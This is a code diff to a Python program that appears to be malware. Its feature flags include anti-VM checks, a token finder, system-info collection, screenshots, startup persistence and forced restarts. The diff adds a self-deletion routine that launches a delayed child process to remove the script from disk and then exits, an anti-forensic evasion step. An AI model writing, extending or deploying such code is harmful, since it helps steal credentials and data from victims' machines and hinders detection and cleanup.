@@ -477,6 +477,15 @@ def startup():
 def restart():
     os.system("shutdown /r /t 0")
 
+def delete():
+    self_path = os.path.abspath(sys.argv[0])
+    subprocess.Popen([
+        sys.executable,
+        "-c",
+        f"import os, time; time.sleep(1); os.remove(r'{self_path}')"
+    ])
+    sys.exit()
+
 def main():
     feature = {
         "anti_vm": False,
@@ -485,7 +494,8 @@ def main():
         "systeminfo": False,
         "screenshot": False,
         "startup": False,
-        "restart": False
+        "restart": False,
+        "self_delete": False
     }
     if feature.get("token", False):
         find_token()
@@ -501,5 +511,7 @@ def main():
         startup()
     if feature.get("restart", False):
         restart()
+    if feature.get("self_delete", False):
+        delete()
 
 main()
